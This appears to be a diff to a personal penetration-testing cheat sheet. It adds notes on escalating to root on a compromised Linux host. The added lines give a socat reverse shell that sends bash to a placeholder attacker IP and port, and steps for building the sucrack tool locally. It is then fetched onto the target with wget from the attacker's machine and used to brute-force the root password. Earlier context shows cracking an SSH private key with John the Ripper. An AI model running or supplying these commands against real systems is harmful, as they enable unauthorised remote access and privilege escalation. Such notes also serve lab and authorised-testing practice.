@@ -147,3 +147,21 @@ Cracking 7zip
 Cracking rsa hash
      # python ssh2john.py id_rsa > id_rsa.hash
      # john id_rsa.hash --wordlist:/usr/share/wordlists/rockyou.txt
+     
+su crack
+https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat
+./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP ADDRESS>:<PORT>
+https://labs.portcullis.co.uk/tools/sucrack/
+     From local machine
+     # tar -xvf sucrack-1.2.3.tar.gz
+     # cd sucrack-1.2.3
+     # ./configure
+     # make
+     # tar -cvf sucrack.tar sucrack-1.2.3/
+     
+     From remote machine
+     # wget http://<local ip>/sucrack
+     # tar xvf sucrack.tar
+     ./sucrack -u root -w 10 /<dict file>
+     
+
